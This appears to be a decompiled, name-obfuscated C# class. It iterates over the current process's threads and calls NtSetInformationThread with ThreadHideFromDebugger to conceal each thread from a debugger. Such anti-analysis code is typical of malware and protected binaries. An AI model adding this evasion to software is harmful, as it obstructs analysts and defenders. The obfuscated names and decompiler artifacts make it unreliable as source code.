using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Rina.Client.Attributes;
using Rina.Client.Exceptions;
using Rina.Composer;
using Rina.States;

namespace Rina.Dispatcher
{
	// Token: 0x02000026 RID: 38
	internal class Global
	{
		// Token: 0x060000C2 RID: 194
		[DllImport("ntdll.dll")]
		internal static extern SecureStringVariantType NtSetInformationThread(IntPtr config, IdentifierType ivk, IntPtr consumer, int column_ivk2);

		// Token: 0x060000C3 RID: 195
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenThread(SIGN spec, bool containsresult, uint position_filter);

		// Token: 0x060000C4 RID: 196
		[DllImport("kernel32.dll")]
		private static extern uint SuspendThread(IntPtr spec);

		// Token: 0x060000C5 RID: 197
		[DllImport("kernel32.dll")]
		private static extern int ResumeThread(IntPtr spec);

		// Token: 0x060000C6 RID: 198
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CloseHandle(IntPtr v);

		// Token: 0x060000C7 RID: 199 RVA: 0x00005F80 File Offset: 0x00004180
		public static void ConnectRef()
		{
			foreach (object obj in Process.GetCurrentProcess().Threads)
			{
				ProcessThread processThread = (ProcessThread)obj;
				Console.ForegroundColor = ConsoleColor.White;
				Console.WriteLine("[GetOSThreads]: thread.Id {0:X}", processThread.Id);
				IntPtr intPtr = Global.OpenThread((SIGN)32, false, (uint)processThread.Id);
				if (intPtr == IntPtr.Zero)
				{
					Console.ForegroundColor = ConsoleColor.Yellow;
					Console.WriteLine("[GetOSThreads]: skipped thread.Id {0:X}", processThread.Id);
				}
				else
				{
					if (Global.SetupRef(intPtr))
					{
						Console.ForegroundColor = ConsoleColor.Green;
						Console.WriteLine("[GetOSThreads]: thread.Id {0:X} hidden from debbuger.", processThread.Id);
					}
					Global.CloseHandle(intPtr);
				}
			}
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x00002ACE File Offset: 0x00000CCE
		public static bool SetupRef(IntPtr last)
		{
			return Global.NtSetInformationThread(last, (IdentifierType)17, IntPtr.Zero, 0) == (SecureStringVariantType)0U;
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x000024D4 File Offset: 0x000006D4
		public Global()
		{
			AdvisorConnectionAttribute.CancelComposer();
			base..ctor();
		}

		// Token: 0x060000CA RID: 202 RVA: 0x00002AE3 File Offset: 0x00000CE3
		internal static bool AwakeDefinition()
		{
			return Global.IncludeDefinition == null;
		}

		// Token: 0x04000060 RID: 96
		internal static object IncludeDefinition;
	}
}
